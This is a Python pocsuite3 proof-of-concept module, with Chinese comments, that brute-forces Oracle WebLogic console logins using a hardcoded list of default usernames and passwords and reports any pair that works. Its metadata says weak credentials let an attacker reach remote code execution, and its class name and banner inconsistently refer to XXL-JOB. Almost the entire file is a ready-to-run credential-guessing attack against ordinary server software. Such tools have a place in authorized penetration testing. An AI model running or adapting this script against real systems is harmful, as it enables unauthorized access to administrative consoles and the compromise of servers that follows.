from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,

)
import base64


class XXLJOBPOC(POCBase):
    vulID = "0"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "7Seven"  # PoC作者的大名
    vulDate = "2022-7-13"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-7-13"  # 编写 PoC 的日期
    updateDate = "2022-7-13"  # PoC 更新的时间,默认和编写时间一样
    references = [""]  # 漏洞地址来源,0day不用写
    name = "weblogic 后台存在弱口令漏洞"  # PoC 名称
    appPowerLink = ""  # 漏洞厂商主页地址
    appName = "weblogic"  # 漏洞应用名称
    appVersion = "all"  # 漏洞影响版本
    vulType = VUL_TYPE.WEAK_PASSWORD  # 弱口令 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # poc对应的产品类型 web的
    samples = ["",""]  # 测试样列,就是用 PoC 测试成功的网站
    # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """weblogic后台管理存在弱口令,导致任意用户可以轻易爆破出来登录后台,通过后台的功能点远程代码执行。"""  # 漏洞简要描述
    pocDesc = """直接登录即可"""  # POC用法描述



    def _check(self):
        result = []
        #弱口令添加上来
        user_list = ["system", "weblogic", "admin", "joe", "mary", "wlcsystem","wlpisystem"]
        # passwd_list = ["passwd", "weblogic", "security", "wlcsystem", "wlpisystem"]
        passwd_list = [ "Oracle@123","weblogic",  "wlcsystem", "security", "passwd"]
        # 这一步是遍历认证信息

        for username in user_list:
            try:
                for passwd in passwd_list:
                    #第一步获取cookie
                    url1  = f"{self.url}/console/login/LoginForm.jsp"
                    data = {
                        'j_username': username,
                        'j_password': passwd,
                        'j_character_enoding': 'UTF-8'
                    }
                    # allow_redirects=False 禁止重定向    ||    verify=False 屏蔽SSL证书认证还是啥
                    req = requests.post(f'{self.url}/console/j_security_check', data=data, allow_redirects=False, verify=False)
                    #响应头是个字典
                    # if response.status_code == 302 and flag1 in response.text and flag2 in response.text and flag3 not in response.text:
                    if req.status_code == 302 and 'console' in req.text and 'LoginForm.jsp' not in req.text:
                        print(f"[+] {self.url}存在弱口令: {username}:{passwd}")
                        self.url += f"  {username} {passwd}"
                        result.append(self.url)
                        break
            except Exception as e:
                # print(e)
                #出现意外就是连接失败,这个时候直接跳出循环,可以省好多步
                break
                # print("{}连接失败".format(url))
        return result

    def _verify(self):
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
banner7 = r'''
                                        ######              
            ######                    ##########            
          ######################################            
        ##::########::::::::::::::::::::##########          
      ##::::::########::::::::::::##::::::::########        
      ##::::::######::::::::::::::::##::::::::######        
    ##::::::######::::::::::::::::::::::::::::::####        
    ##::::::::##::::::::::::::::::::::::::::::::::##        
  ##::::::####::::::##::::::::::::::##::::::::  ::##        
  ##::::::##::::::##::::::::::::::::##::      ::::::##      
  ##::::::##::::::##::      ::    ##  ##::::::::::::##      
##::::::::##::::::##::::::::##::::##  ####::::##::::##      
##::::::::##::::##::::::::##::::##      ##::::::##::##      
##::::::::##::::##::::::##::::::##    ######::::####        
##::::::::##::####::::##########      ##  ##::::####        
##::::::::##::########  ####  ##      ##  ##::::##          
##::::::::##########::    ##          ::  ##::########  ##  
##::::::::####::####::  ##::          ##  ##::####  ####  ##
##::::::::##  ######::  ####              ####::##  ##    ##
##::::::::##    ##::::          ##       ####::::##      ## 
##::::::::##      ####::            ######::::::##    ##    
##::::::::::##        ############::##  ##::::##    ##      
##::::::::::##      ##    ########::####::####    ##        
##::::::::::##    ##::::##########::########    ####        
##::::::::::##  ########::::####::##::####    ##::::##      
##::::::::::::##############::::######::##  ##::::::##      
  ##::::::::::####  ########################::::::::##      
  ##::::::::::##  ####::::::::::::::::::####::::::::##      
    ##::::::::##      ##################    ##::::##        
      ##::::##      ########      ##::##      ####          
        ####        ##::##          ####                    
                      ##                                                                        

                                            version:xxl-job 弱口令
'''
print(banner7)
register_poc(XXLJOBPOC)
